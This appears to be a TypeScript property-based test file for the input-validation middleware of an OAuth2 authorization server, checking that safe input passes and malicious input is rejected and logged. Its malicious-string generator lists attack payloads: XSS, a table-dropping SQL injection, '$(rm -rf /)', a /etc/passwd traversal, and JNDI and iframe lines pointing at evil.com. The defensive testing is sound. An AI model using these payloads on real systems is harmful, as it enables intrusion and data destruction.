import { Request, Response, NextFunction } from 'express';
import { vi, describe, it, expect, beforeEach, afterEach } from 'vitest';
import fc from 'fast-check';
import { validateInput, validateAuthorizationRequest, validateTokenRequest, validateIntrospectionRequest } from './validation';

// Mock Express objects
const mockRequest = (query: any = {}, body: any = {}, headers: any = {}): Partial<Request> => ({
  query,
  body,
  headers,
  get: (header: string) => headers[header.toLowerCase()],
  ip: '127.0.0.1',
  path: '/test',
  method: 'GET',
  connection: { remoteAddress: '127.0.0.1' } as any
});

const mockResponse = (): Partial<Response> => {
  const res: any = {};
  res.status = vi.fn().mockReturnValue(res);
  res.json = vi.fn().mockReturnValue(res);
  return res;
};

const mockNext: NextFunction = vi.fn();

// Property-based test generators
const safeStringArbitrary = () => fc.string({ minLength: 1, maxLength: 100 })
  .filter(s => s.trim().length > 0) // Ensure non-empty after trimming
  .filter(s => !/[<>&"'`(){}[\];|$\0*!#]/.test(s)) // Safe strings without dangerous characters
  .filter(s => !s.includes('--')) // Avoid SQL comment patterns
  .filter(s => !s.includes('/*')) // Avoid SQL comment patterns
  .filter(s => !s.includes('*/')) // Avoid SQL comment patterns
  .filter(s => !/\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b/gi.test(s)) // Avoid SQL keywords
  .filter(s => !s.includes('<%')) // Avoid template injection patterns
  .filter(s => !s.includes('%>')) // Avoid template injection patterns
  .filter(s => !s.includes('{{')) // Avoid template injection patterns
  .filter(s => !s.includes('}}')) // Avoid template injection patterns
  .filter(s => !s.includes('#{')) // Avoid template injection patterns

const maliciousStringArbitrary = () => fc.oneof(
  fc.constant('<script>alert("xss")</script>'),
  fc.constant("'; DROP TABLE users; --"),
  fc.constant('$(rm -rf /)'),
  fc.constant('../../../etc/passwd'),
  fc.constant('javascript:alert(1)'),
  fc.constant('<iframe src="evil.com"></iframe>'),
  fc.constant('${jndi:ldap://evil.com}'),
  fc.constant('{{7*7}}'),
  fc.constant('<%=7*7%>'),
  fc.constant('#{7*7}'),
  fc.constant('&lt;script&gt;'),
  fc.constant('SELECT * FROM users'),
  fc.constant('UNION SELECT password FROM users')
);

const validOAuthParametersArbitrary = () => fc.record({
  response_type: fc.constant('code'),
  client_id: fc.string({ minLength: 1, maxLength: 50 }).filter(s => /^[a-zA-Z0-9_-]+$/.test(s)),
  redirect_uri: fc.oneof(
    fc.constant('https://example.com/callback'),
    fc.constant('http://localhost:3000/callback'),
    fc.constant('https://app.example.com/oauth/callback')
  ),
  scope: fc.array(
    fc.string({ minLength: 1, maxLength: 20 }).filter(s => /^[a-zA-Z0-9_:-]+$/.test(s)),
    { minLength: 1, maxLength: 5 }
  ).map(scopes => scopes.join(' ')),
  state: fc.string({ minLength: 1, maxLength: 50 }).filter(s => /^[a-zA-Z0-9_.-]+$/.test(s))
});

const invalidOAuthParametersArbitrary = () => fc.record({
  response_type: fc.oneof(
    fc.constant('token'),
    fc.constant('invalid'),
    fc.constant(''),
    fc.string().filter(s => !['code', 'token', 'id_token'].includes(s))
  ),
  client_id: fc.oneof(
    fc.constant(''),
    fc.string().filter(s => !/^[a-zA-Z0-9_-]+$/.test(s) || s.length > 255),
    maliciousStringArbitrary()
  ),
  redirect_uri: fc.oneof(
    fc.constant('invalid-uri'),
    fc.constant('ftp://example.com'),
    fc.constant(''),
    maliciousStringArbitrary()
  ),
  scope: fc.oneof(
    fc.constant('invalid@scope'),
    fc.constant('scope with spaces but invalid chars!'),
    maliciousStringArbitrary()
  ),
  state: fc.oneof(
    fc.string().filter(s => !/^[a-zA-Z0-9_.-]+$/.test(s) || s.length > 255),
    maliciousStringArbitrary()
  )
});

const validTokenRequestArbitrary = () => fc.record({
  grant_type: fc.constant('authorization_code'),
  code: fc.string({ minLength: 10, maxLength: 100 }).filter(s => /^[a-zA-Z0-9_-]+$/.test(s)),
  client_id: fc.string({ minLength: 1, maxLength: 50 }).filter(s => /^[a-zA-Z0-9_-]+$/.test(s)),
  client_secret: fc.string({ minLength: 10, maxLength: 100 })
});

const validIntrospectionRequestArbitrary = () => fc.record({
  token: fc.string({ minLength: 10, maxLength: 200 }).filter(s => /^[a-zA-Z0-9_.-]+$/.test(s))
});

describe('Feature: oauth2-authorization-server, Property 11: Input Validation and Security', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Suppress console.warn for security events in tests
    vi.spyOn(console, 'warn').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  /**
   * Property 11: Input Validation and Security
   * For any user input or request parameter, the system should validate and sanitize inputs 
   * to prevent injection attacks, reject malicious requests, and log security events
   * Validates: Requirements 6.2, 6.4
   */
  it('Property 11: Safe inputs should always pass validation', () => {
    fc.assert(fc.property(
      safeStringArbitrary(),
      safeStringArbitrary(),
      safeStringArbitrary(),
      (param1, param2, param3) => {
        const req = mockRequest({
          safe_param1: param1,
          safe_param2: param2
        }, {
          safe_body_param: param3
        });
        const res = mockResponse();
        
        validateInput()(req as Request, res as Response, mockNext);
        
        // Safe inputs should not trigger security blocks
        expect(res.status).not.toHaveBeenCalledWith(400);
        expect(mockNext).toHaveBeenCalled();
        
        // Values should be sanitized (trimmed, normalized)
        expect(typeof req.query.safe_param1).toBe('string');
        expect(typeof req.query.safe_param2).toBe('string');
        expect(typeof req.body.safe_body_param).toBe('string');
        
        // Should not be empty after sanitization
        expect((req.query.safe_param1 as string).length).toBeGreaterThan(0);
        expect((req.query.safe_param2 as string).length).toBeGreaterThan(0);
        expect((req.body.safe_body_param as string).length).toBeGreaterThan(0);
      }
    ), { numRuns: 50 }); // Reduced runs for stability
  });

  it('Property 11: Malicious inputs should always be rejected', () => {
    fc.assert(fc.property(
      maliciousStringArbitrary(),
      (maliciousInput) => {
        const req = mockRequest({
          malicious_param: maliciousInput
        });
        const res = mockResponse();
        
        validateInput()(req as Request, res as Response, mockNext);
        
        // Malicious inputs should be blocked
        expect(res.status).toHaveBeenCalledWith(400);
        expect(res.json).toHaveBeenCalledWith({
          error: 'invalid_request',
          error_description: 'Request contains invalid characters'
        });
        expect(mockNext).not.toHaveBeenCalled();
      }
    ), { numRuns: 50 }); // Reduced runs for stability
  });

  it('Property 11: Valid OAuth parameters should always pass validation', () => {
    fc.assert(fc.property(
      validOAuthParametersArbitrary(),
      (oauthParams) => {
        const req = mockRequest(oauthParams);
        const res = mockResponse();
        
        validateInput()(req as Request, res as Response, mockNext);
        
        // Valid OAuth parameters should pass
        expect(mockNext).toHaveBeenCalled();
        expect(res.status).not.toHaveBeenCalledWith(400);
        
        // Parameters should be properly sanitized
        Object.keys(oauthParams).forEach(key => {
          expect(typeof req.query[key]).toBe('string');
          expect((req.query[key] as string).length).toBeGreaterThan(0);
        });
      }
    ), { numRuns: 100 });
  });

  it('Property 11: Invalid OAuth parameters should always be rejected with validation errors', () => {
    fc.assert(fc.property(
      invalidOAuthParametersArbitrary(),
      (invalidParams) => {
        const req = mockRequest(invalidParams);
        const res = mockResponse();
        
        validateInput()(req as Request, res as Response, mockNext);
        
        // Invalid parameters should be rejected
        expect(res.status).toHaveBeenCalledWith(400);
        expect(mockNext).not.toHaveBeenCalled();
        
        // Should return proper error structure
        const errorCall = res.json.mock.calls[0];
        if (errorCall) {
          const errorResponse = errorCall[0];
          expect(errorResponse).toHaveProperty('error');
          expect(errorResponse.error).toMatch(/invalid_request/);
        }
      }
    ), { numRuns: 100 });
  });

  it('Property 11: Authorization requests with required parameters should pass', () => {
    fc.assert(fc.property(
      validOAuthParametersArbitrary(),
      (oauthParams) => {
        // Ensure required parameters are present
        const requiredParams = {
          ...oauthParams,
          response_type: 'code', // Force valid response_type
          client_id: oauthParams.client_id || 'test-client'
        };
        
        const req = mockRequest(requiredParams);
        const res = mockResponse();
        
        validateAuthorizationRequest()(req as Request, res as Response, mockNext);
        
        // Should pass validation
        expect(mockNext).toHaveBeenCalled();
        expect(res.status).not.toHaveBeenCalledWith(400);
      }
    ), { numRuns: 100 });
  });

  it('Property 11: Token requests with valid format should pass', () => {
    fc.assert(fc.property(
      validTokenRequestArbitrary(),
      (tokenParams) => {
        const req = mockRequest({}, tokenParams, {
          'content-type': 'application/x-www-form-urlencoded'
        });
        const res = mockResponse();
        
        validateTokenRequest()(req as Request, res as Response, mockNext);
        
        // Should pass validation
        expect(mockNext).toHaveBeenCalled();
        expect(res.status).not.toHaveBeenCalledWith(400);
      }
    ), { numRuns: 100 });
  });

  it('Property 11: Introspection requests with valid tokens should pass', () => {
    fc.assert(fc.property(
      validIntrospectionRequestArbitrary(),
      (introspectionParams) => {
        const req = mockRequest({}, introspectionParams);
        const res = mockResponse();
        
        validateIntrospectionRequest()(req as Request, res as Response, mockNext);
        
        // Should pass validation
        expect(mockNext).toHaveBeenCalled();
        expect(res.status).not.toHaveBeenCalledWith(400);
      }
    ), { numRuns: 100 });
  });

  it('Property 11: String sanitization should be consistent and safe', () => {
    fc.assert(fc.property(
      fc.string({ minLength: 0, maxLength: 500 }),
      (inputString) => {
        const req = mockRequest({
          test_param: inputString
        });
        const res = mockResponse();
        
        validateInput()(req as Request, res as Response, mockNext);
        
        // If the request passes validation, the sanitized string should be safe
        if (mockNext.mock.calls.length > 0) {
          const sanitizedValue = req.query.test_param as string;
          
          // Should not contain null bytes
          expect(sanitizedValue).not.toContain('\0');
          
          // Should be trimmed
          expect(sanitizedValue).toBe(sanitizedValue.trim());
          
          // Should not exceed length limit
          expect(sanitizedValue.length).toBeLessThanOrEqual(2048);
          
          // Should be a string
          expect(typeof sanitizedValue).toBe('string');
        }
      }
    ), { numRuns: 100 });
  });

  it('Property 11: Security logging should occur for all malicious requests', () => {
    const consoleSpy = vi.spyOn(console, 'warn');
    
    fc.assert(fc.property(
      maliciousStringArbitrary(),
      (maliciousInput) => {
        consoleSpy.mockClear();
        
        const req = mockRequest({
          malicious_param: maliciousInput
        });
        const res = mockResponse();
        
        validateInput()(req as Request, res as Response, mockNext);
        
        // Security events should be logged for malicious inputs that are detected and blocked
        if (res.status.mock.calls.length > 0 && res.status.mock.calls[0][0] === 400) {
          // If request was blocked due to malicious content, logging should have occurred
          const errorResponse = res.json.mock.calls[0]?.[0];
          if (errorResponse?.error_description === 'Request contains invalid characters') {
            // This indicates malicious patterns were detected, so logging should have occurred
            expect(consoleSpy).toHaveBeenCalled();
            
            // Should contain security event information in structured JSON format
            const logCall = consoleSpy.mock.calls[0];
            if (logCall) {
              const logMessage = logCall[0];
              // The new structured logging outputs JSON, so check for security event structure
              expect(logMessage).toContain('Security event detected');
              expect(logMessage).toContain('ValidationMiddleware');
            }
          }
        }
      }
    ), { numRuns: 30 }); // Reduced runs for stability
    
    consoleSpy.mockRestore();
  });
});